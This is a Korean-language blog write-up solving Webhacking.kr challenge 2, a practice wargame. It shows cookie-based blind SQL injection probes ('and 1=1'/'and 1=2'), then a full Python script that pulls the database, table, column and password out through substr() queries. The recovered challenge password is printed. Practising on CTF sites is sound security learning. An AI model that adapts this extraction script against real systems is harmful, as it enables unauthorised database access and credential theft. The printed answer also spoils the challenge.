---
published: true
layout: "single"
title: "[Webhacking.kr] Challenge 문제풀이 - 2번"
category: "Webhacking.kr"
comments: true
---

오늘은 Webhacking.kr 챌린지의 2번 문제를 풀어보자.

![문제화면](https://user-images.githubusercontent.com/37629503/79815001-9975a080-83ba-11ea-85fa-297d556c3156.png)

위와같이 간단한 텍스트만 보여준다. 그럼 개발자도구를 열어서 소스코드를 확인해보자.

```html
<!--
2020-04-21 10:21:12
-->
<html>
    <head>
        <script src="chrome-extension://mooikfkahbdckldjjndioackbalphokd/assets/prompt.js"></script>
    </head>
    <body>
        <h2>Restricted area</h2>
        Hello stranger. Your IP is logging...
        <!-- if you access admin.php i will kick your ass -->
    </body>
</html>
```

예상한대로 위 소스코드에서 힌트를 얻을 수 있는데 `admin.php`에 접근하지 말라는 주석이 보인다. 그렇다면 우리는 바로 `admin.php`에 접속해보자. 그냥 문제 URL 뒤에 admin.php를 입력해주면된다.

![image](https://user-images.githubusercontent.com/37629503/79815256-2e789980-83bb-11ea-85b9-b8f32d32d7a5.png)

그럼 우리는 하나의 입력폼을 볼 수 있다. 패스워드를 입력하라고 나오는데 아마 이번 문제는 이 패스워드를 알아내는게 해결법인것 같다. 일단 여기서도 개발자도구를 열어서 소스코드를 확인해보자.

```html
<html>
    <head>
        <sipt src="chrome-extension://mooikfkahbdckldjjndioackbalphokd/assets/prompt.js"></script>
    </head>
    <body>
        <form method="post">
            type your secret password
            <input name="pw">
            <input type="submit">
        </form>
    </body>
</html>
```

아쉽게도 이번 페이지에서는 유의미한 정보를 얻을 수 없었다. 그렇다면 저번 문제처럼 쿠키값을 조작하는 문제가 아닐까 예측해본다. 마침 문제페이지에도 현재시각이 주석으로 나타나고있었다. 먼저 쿠키값을 확인해보자.

![image](https://user-images.githubusercontent.com/37629503/79815589-0b9ab500-83bc-11ea-9667-831347b559ac.png)

뭔가 쿠키값을 가지고 조작해 볼수 있을것 같다. 이전 페이지에서 현재 시각이 주석으로 나타나고 있었으니 `time`값을 변조해보도록 하자.

```html
<!--
2070-01-01 09:00:01
-->
```

이전 페이지로 돌아와서 time 값에 `and 1=1`을 추가해주니 시간 주석이 위와 같이 변했다. 그럼 이제 다른 값을 넣어서 주석이 어떻게 변화하는지 확인해보자.

```html
<!--
2070-01-01 09:00:00
-->
```

`and 1=2`를 추가했더니 주석이 또 바뀌었다. 두 번의 쿠키 조작을 통해 이 문제는 blind sql injection을 이용해서 해결해야하는 문제임을 알아냈다. 또한 값이 참일 경우에는 **09:00:01**을 값이 거짓일 경우에는 **09:00:00**을 반환한다는 사실도 알아냈다.

그렇다면 이제 SQL 쿼리문을 서버로 보내서 어드민 페이지의 비밀번호를 알아내보도록 하자. 먼저 현재 접속중인 데이터베이스의 이름과 테이블의 이름을 알아내야 한다. 나는 다음의 파이썬 코드를 이용해서 이름을 알아냈다. 물론 이 과정을 수작업으로 진행해도 좋다.

```python
import requests as req

def HttpRequest(d_name=None,c_name=None,t_name=None):
    global ch
    value=''
    for i in range(1,20):
        for key in keyword:
            if ch==0:
                cookies['time'] = 'substr((select database()),{},1)="{}"'.format(i,key)
            elif ch==1:
                cookies['time'] = 'substr((select group_concat(table_name) from information_schema.tables \
                where table_schema="{}"),{},1)="{}"'.format(db_name,i,key)
            elif ch==2:
                cookies['time'] = 'substr((select group_concat(column_name) from information_schema.columns where \
                table_name="{}"),{},1)="{}"'.format(table_name,i,key)
            elif ch==3:
                cookies['time'] = 'substr((select {} from {}),{},1)="{}"'.format(column_name,table_name,i,key)
            res = req.get(url,headers=headers,cookies=cookies)

            if "09:00:01" in res.text:
                value+=key
                print(value)
                break
            if key == '0':
                print("END")
                ch+=1
                return value

if __name__ == '__main__':
    url = 'https://webhacking.kr/challenge/web-02/'
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
                AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117'}
    cookies = {'PHPSESSID':'8p264id0afh6jme85rjj4plei4'}
    keyword = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    ch=0
    db_name = HttpRequest()
    table_name = HttpRequest(d_name=db_name)
    column_name = HttpRequest(t_name=table_name)
    data = HttpRequest(c_name=column_name,t_name=table_name)

    print("============================")
    print("DB NAME = "+db_name)
    print("TABLE NAME = "+table_name)
    print("COLUMN NAME = "+column_name)
    print("data = "+data)
    print("============================")
```

위 코드를 실행하고 프로그램이 종료될 때까지 기다리면 다음과 같은 결과를 얻을 수 있다.

```text
============================
DB NAME = chall2
TABLE NAME = admin_area_pw
COLUMN NAME = pw
data = kudos_to_beistlab
============================
```

이 중 data 구문이 우리가 필요한 정보이므로 이 문자를 `admin.php` 페이지에 입력해보자.

![tempsnip](https://user-images.githubusercontent.com/37629503/79818541-0bea7e80-83c3-11ea-9536-4d215976e184.png)

문제 해결!
